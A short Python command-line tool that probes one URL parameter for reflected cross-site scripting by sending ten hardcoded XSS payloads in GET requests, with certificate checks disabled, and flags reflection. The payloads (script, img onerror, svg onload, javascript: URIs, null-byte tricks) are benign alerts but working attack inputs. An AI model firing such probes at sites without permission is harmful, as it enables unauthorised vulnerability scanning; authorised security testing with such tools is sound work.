#!/usr/bin/python

###     XSS detector script with only GET request.
###     Author: Alvaro Trigo
###     Version 1.0

import requests
import argparse
import sys
import subprocess
import urllib3

##      Define arguments

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Target to check.")
parser.add_argument("-p", "--parameter", help="Parameter to fuzz.")
args = parser.parse_args()

##      Defining xss checkings

payloads = ['1"/><script>alert(923650129542903210)</script><!--','1"/><IMG SRC="javascript:alert(923650129542903210);"><!--','1"/><ScRipT>alert(923650129542903210)</ScRipT><!--','1"/><svg><script>varmyvar="text&quot;;alert(923650129542903210)//";</script></svg><!--','1"/><img src="http://lolololo.com" onerror=alert(923650129542903210)><!--','1"/><iframesrc="javascript:alert(923650129542903210)"><!--','1"/><svg/onload=prompt(923650129542903210);><!--','1"/><scr\x00ipt>confirm(923650129542903210);</scr\x00ipt><!--','1"/><a href="http://moco.com">Pinche+aqui</a><!--','1"/><a href="http://moco.com" onmouseover="javascript:window.onerror=alert;throw 923650129542903210">Pinche+aqui</a><!--']

##      If execute the script without parameters, show help

if(len(sys.argv)==1 or not(args.parameter)):
        subprocess.call([sys.argv[0], '-h'])
        sys.exit()

##      Variables definition

flag_success = 0
cont = 1

##      Disabling ssl warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print('')
print('XSSchecker v1.0 - Simple XSS detector using get HTTP requests - by Alvaro Trigo')
print('')

try:
        print('[+]  Preparing HTTP evil request...')
        url = args.target
        if(url.find(args.parameter + '=') != -1):
                url_part1 = url[0:url.find(args.parameter + '=')]
                url_part2 = url[url.find(args.parameter + '='):len(url)]
                if(url_part2.find('&') != -1):
                        url_part2 = url_part2[url_part2.find('&'):]
                else:
                        url_part2 = ''
                for payload in payloads:
                        url = url_part1 + args.parameter + '=' + payload + url_part2
                        print('[+]  Sending evil request....[' + str(cont) + '/' + str(len(payloads)) + ']')
                        r = requests.get(url, verify=False)
                        if(r.status_code != 200):
                                print('[-]  Problems with the connection. HTML error ' + str(r.status_code))
                        else:
                                if(r.text.find(payload) != -1):
                                        # If you can find the payload in the request without any obfuscation could be vulnerable
                                        print('[+]  Target seems to be VULNERABLE with the request ' + url)
                                        flag_success = 1
                        cont = cont + 1
                if(flag_success == 0):
                        print('[-]  Target not seems to be vulnerable to XSS vulnerability')
        else:
                print('[-]  The parameter to fuzz is not into the url.')
except:
        print('[-]  An error happens...')